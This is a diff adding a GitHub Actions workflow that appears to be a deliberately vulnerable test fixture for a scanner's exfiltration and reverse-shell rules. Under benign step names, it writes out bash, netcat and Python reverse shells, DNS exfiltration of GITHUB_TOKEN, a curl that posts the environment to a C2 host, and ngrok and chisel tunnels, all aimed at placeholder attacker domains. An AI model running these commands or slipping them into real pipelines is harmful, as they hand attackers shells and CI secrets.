@@ -1,0 +1,50 @@
+# ============================================================================
+# SCENARIO 04: Network Exfiltration & Reverse Shell
+# ============================================================================
+# This workflow contains patterns for data exfiltration via DNS tunneling,
+# reverse shells, C2 (command-and-control) connections, and tunneling tools.
+#
+# SCG Detection: Network Exfiltration Scanner (SCA-019 to SCA-048)
+# Expected Severity: CRITICAL
+# ============================================================================
+
+name: "Integration Tests (VULNERABLE)"
+on:
+  push:
+    branches: [main]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      # ⚠️ REVERSE SHELL: Classic bash reverse shell pattern
+      - name: Setup test server
+        run: |
+          bash -i >& /dev/tcp/attacker.evil.com/4444 0>&1
+
+      # ⚠️ DNS EXFILTRATION: Encoding secrets in DNS queries
+      - name: DNS health check
+        run: |
+          data=$(echo "$GITHUB_TOKEN" | base64)
+          nslookup ${data}.exfil.attacker.com
+
+      # ⚠️ C2 TUNNEL: Using ngrok to expose internal services
+      - name: Debug tunnel
+        run: |
+          ngrok http 8080 --log=stdout &
+          chisel client attacker.com:8443 R:socks &
+
+      # ⚠️ CURL TO SUSPICIOUS ENDPOINT: Sending env to external server
+      - name: Report metrics
+        run: |
+          curl -s https://evil-c2-server.xyz/collect \
+            -d "$(env | base64)" \
+            -H "X-Token: $(cat $GITHUB_EVENT_PATH)"
+
+      # ⚠️ NETCAT LISTENER
+      - name: Health check
+        run: |
+          nc -e /bin/sh attacker.evil.com 9999
+          python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('attacker.evil.com',1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(['/bin/sh','-i'])"
